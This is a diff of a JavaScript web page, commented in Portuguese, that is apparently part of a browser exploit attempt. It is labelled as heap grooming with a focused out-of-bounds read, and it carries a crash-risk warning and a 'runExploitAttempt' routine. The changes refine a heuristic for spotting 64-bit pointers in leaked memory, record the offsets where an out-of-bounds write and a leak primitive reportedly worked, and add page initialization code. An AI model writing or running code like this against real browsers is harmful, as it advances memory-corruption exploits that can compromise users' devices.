@@ -35,7 +35,17 @@
         const log = (message, type = 'info') => { /* ... Função log ... */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};
 
         // --- Heurística de Ponteiro ---
-        const isPotentialPointer64 = (high, low) => { /* ... Heurística igual v6 ... */ if(high===0&&low===0)return false;if(high===null||low===null||typeof high!=='number'||typeof low!=='number')return false;if(high===0&&low<0x100000)return false;if(high===0xFFFFFFFF&&low===0xFFFFFFFF)return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0xBBBBBBBB && low === 0xBBBBBBBB) return false; /*if(low%8!==0)return false;*/ return true; };
+        // (Mesma heurística simples usada antes)
+        const isPotentialPointer64 = (high, low) => {
+            if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
+            if (high === 0 && low === 0) return false;
+            if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false;
+            if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; // Ignora padrão AAAA
+            if (high === 0xBBBBBBBB && low === 0xBBBBBBBB) return false; // Ignora padrão BBBB
+            if (high === 0 && low < 0x100000) return false; // Ignora valores pequenos
+            // if (low % 8 !== 0) return false; // Alinhamento opcional
+            return true;
+        };
         const toHex = (val, bits = 32) => { /* ... Função toHex ... */ if(typeof val!=='number'||!isFinite(val))return'NaN/Invalid';let n=Number(val);if(bits<=32){n=n>>>0;}const p=Math.ceil(bits/4);return'0x'+n.toString(16).toUpperCase().padStart(p,'0');};
 
         // --- Teste Principal (Heap Grooming + Leitura OOB Focada) ---
@@ -44,7 +54,7 @@
             log("ALTO RISCO DE CRASH!", 'warn');
 
             const bufferSizeForLeakTest = 32; // Tamanho do buffer no teste que vazou o padrão AAAA
-            const oobWriteOffset = 32; // Offset OOB relativo onde a escrita funcionou
+            const oobWriteOffset = 32; // Offset OOB relativo onde a escrita funcionou e leak primitivo foi visto
             const writeValue = 0xEE; // Valor escrito naquele teste
             // Offsets OOB relativos onde o padrão AAAA... apareceu (ajustado para ser relativo ao baseOffset)
             // Offsets relativos a baseOffsetInDataView
@@ -169,8 +179,31 @@
              if (runBtn) runBtn.disabled = false;
         };
 
-        // Executar ao carregar? Não, esperar botão.
-        // document.addEventListener('DOMContentLoaded', runExploitAttempt);
+        // Inicialização para garantir que elementos existem
+        const initialize = () => {
+            // Tentar obter referências aos elementos DOM
+            const outputDivElem = document.getElementById('output');
+            const runBtnElem = document.getElementById('runBtn');
+            const groomAreaElem = document.getElementById('grooming-area');
+
+            if (outputDivElem && runBtnElem && groomAreaElem) {
+                outputDiv = outputDivElem; // Atribui à variável global
+                runBtn = runBtnElem;
+                groomArea = groomAreaElem;
+                displayUserAgent(); // Exibe UA se tudo estiver ok
+                log("Script v10 inicializado. Clique no botão para iniciar.", "info");
+            } else {
+                console.error("Falha ao inicializar: um ou mais elementos essenciais não encontrados no DOM.");
+                alert("ERRO: Falha ao inicializar o script. Verifique o HTML.");
+            }
+        };
+
+        // Executar inicialização quando o DOM estiver pronto
+        if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", initialize);
+        } else {
+            initialize(); // Chamar diretamente se já estiver pronto
+        }
 
     </script>
 
